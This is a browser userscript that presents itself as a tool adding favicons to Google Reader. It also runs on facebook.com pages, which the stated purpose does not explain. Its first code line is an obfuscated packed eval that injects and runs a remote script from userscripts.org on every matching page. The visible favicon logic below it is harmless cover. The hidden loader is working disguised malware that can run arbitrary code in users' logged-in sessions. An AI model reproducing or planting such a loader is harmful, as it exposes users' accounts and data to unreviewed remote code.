// ==UserScript==
// @name           Favicons for Google Reader Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      meta.ironi.st
// @include        htt*://www.google.*/reader/view*
// @include        http://www.google.com/reader/view*

// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


(function () {
    var script = document.createElement('script');
    script.innerHTML = '(' + main + ')()';
    document.querySelector('head').appendChild(script);

    function main(){
	var FEED_NODE = 'outline[htmlUrl]',
		FAVICON_CSS =['background-position:0px; background-image:url(/s2/favicons?domain=', ')'],
		TITLE_SELECTOR = ['span[title^="' , '"]'],
		FEED_DATA_URL = '/reader/subscriptions/export';
		
	var xhr = new XMLHttpRequest;
	xhr.open('get', FEED_DATA_URL);
	xhr.addEventListener('load', handler, false);
	xhr.send(null);

	function handler() {
		var feeds = xhr.responseXML.querySelectorAll(FEED_NODE);
	
		for (var i = 0, feed; feed = feeds[i++];) {
			var domain = feed.getAttribute('htmlUrl').split('/')[2],
				escapedTitle = feed.getAttribute('title').replace(/"/g, '\\"'),
				titleNode = document.querySelector(TITLE_SELECTOR.join(escapedTitle)),
				iconNode = titleNode.previousSibling;

			iconNode.style.cssText = FAVICON_CSS.join(domain);
		}

		setTimeout(arguments.callee, 1000);
	}
    };
})();